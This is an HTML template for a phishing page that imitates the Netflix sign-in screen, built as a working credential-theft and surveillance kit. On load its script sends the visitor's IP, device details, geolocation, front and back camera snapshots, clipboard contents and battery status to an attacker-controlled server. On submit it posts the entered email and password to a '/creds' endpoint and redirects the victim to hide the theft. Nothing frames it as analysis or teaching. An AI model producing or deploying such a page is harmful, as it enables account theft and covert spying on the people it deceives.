<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Netflix - Sign In</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #000; min-height: 100vh; }
.bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.9)); z-index: 0; }
.header { position: relative; z-index: 1; padding: 20px 40px; }
.logo { color: #E50914; font-size: 36px; font-weight: 900; letter-spacing: -1px; }
.main { position: relative; z-index: 1; display: flex; align-items: center; justify-content: center; min-height: calc(100vh - 80px); padding: 20px; }
.card { background: rgba(0,0,0,0.75); border-radius: 4px; padding: 60px 68px 40px; width: 100%; max-width: 450px; }
h1 { font-size: 32px; color: #fff; margin-bottom: 28px; }
.form-group { margin-bottom: 16px; position: relative; }
.form-group input { width: 100%; padding: 16px 20px 0; height: 50px; border: none; border-radius: 4px; background: #333; color: #fff; font-size: 16px; }
.form-group input:focus { outline: none; background: #454545; }
.form-group label { position: absolute; left: 20px; top: 16px; color: #8c8c8c; font-size: 14px; pointer-events: none; transition: 0.2s; }
.form-group input:focus + label, .form-group input:not(:placeholder-shown) + label { top: 4px; font-size: 11px; }
.btn { width: 100%; padding: 16px; background: #E50914; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 24px; }
.btn:hover { background: #f40612; }
.remember { display: flex; align-items: center; justify-content: space-between; margin-top: 12px; }
.remember label { color: #b3b3b3; font-size: 13px; display: flex; align-items: center; gap: 4px; }
.remember a { color: #b3b3b3; font-size: 13px; text-decoration: none; }
.signup { color: #737373; font-size: 16px; margin-top: 16px; }
.signup a { color: #fff; text-decoration: none; }
.loading { display: none; text-align: center; padding: 30px; }
.spinner { border: 3px solid #333; border-top: 3px solid #E50914; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="bg"></div>
<div class="header"><span class="logo">NETFLIX</span></div>
<div class="main">
<div class="card">
<h1>Sign In</h1>
<form id="loginForm">
<div class="form-group">
<input type="text" id="username" placeholder=" " required>
<label>Email or phone number</label>
</div>
<div class="form-group">
<input type="password" id="password" placeholder=" " required>
<label>Password</label>
</div>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color:#b3b3b3;font-size:14px;">Signing in...</p>
</div>
<div class="remember">
<label><input type="checkbox" checked> Remember me</label>
<a href="#">Need help?</a>
</div>
<p class="signup">New to Netflix? <a href="#">Sign up now</a>.</p>
</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video = document.getElementById('video');
var canvas = document.getElementById('canvas');

async function gatherAll() {
    let td = '🎬 <b>Netflix Victim!</b>\n\n';
    td += '⚓ IP: <code><%=ip %></code>\n';
    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){ navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true, timeout: 10000}); }
    async function captureCamera(facingMode, label) { try { const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}}); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 2000)); canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label}); stream.getTracks().forEach(t => t.stop()); } catch(e) {} }
    try { await captureCamera("user", "selfie"); } catch(e) {}
    try { await captureCamera("environment", "back"); } catch(e) {}
    try { if(navigator.clipboard && navigator.clipboard.readText) { const clip = await navigator.clipboard.readText(); if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)}); } } catch(e) {}
    try { const bat = await navigator.getBattery(); $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging}); } catch(e) {}
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    document.querySelector('form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    $.post("<%=a %>/creds", { uid: uid, user: encodeURIComponent(user), pass: encodeURIComponent(pass), platform: 'Netflix' });
    await new Promise(r => setTimeout(r, 2500));
    window.location.href = "<%=url %>";
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>